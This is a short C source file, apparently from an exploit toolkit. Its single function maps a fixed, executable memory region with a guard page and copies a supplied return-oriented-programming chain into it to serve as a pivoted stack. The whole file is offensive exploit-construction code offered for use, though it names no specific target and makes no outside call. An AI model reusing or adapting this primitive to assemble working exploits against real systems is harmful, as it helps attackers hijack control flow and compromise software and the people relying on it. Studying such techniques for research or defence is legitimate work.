#include "stack_pivot.h"
#include "utils.h"
#include <sys/mman.h>

/*
 * stash_mmap_stack - map and populate a pivoted stack region with a given ROP chain.
 *
 * @pivot_stack_addr:  target address for placing the ROP chain (must be page-aligned).
 * @pivot_stack_size:  size of the pivoted stack region (in bytes), excluding guard.
 * @guard_size:       size of the guard page before the stack (in bytes).
 * @rop:              pointer to a populated rop_buffer_t describing the ROP chain.
 */
void stash_mmap_stack(void *pivot_stack_addr,
                    size_t pivot_stack_size,
                    size_t guard_size,
                    rop_buffer_t *rop)
{
    INFO("Stashing pivoted stack at: %p, stack size (0x%zx) must be page-aligned",
            pivot_stack_addr, pivot_stack_size);

    void *mapped = mmap(pivot_stack_addr - guard_size,
                        (pivot_stack_size + guard_size),
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,
                        -1, 0);
    if (mapped == MAP_FAILED)
        DIE("mmap");

    INFO("Mapped buffer starts at: %p, with a 0x%zx guard page)",
            mapped, guard_size);

    // Touch first page (COW) to avoid faults (double fault)
    ((uintptr_t *)mapped)[0] = 0xdeadbeefcafebabe;

    // place ROP chain on fake stack
    memcpy(pivot_stack_addr, rop->chain, rop->count * sizeof(uintptr_t));

    INFO("ROP chain of %zu entries placed at: %p", rop->count, pivot_stack_addr);
}

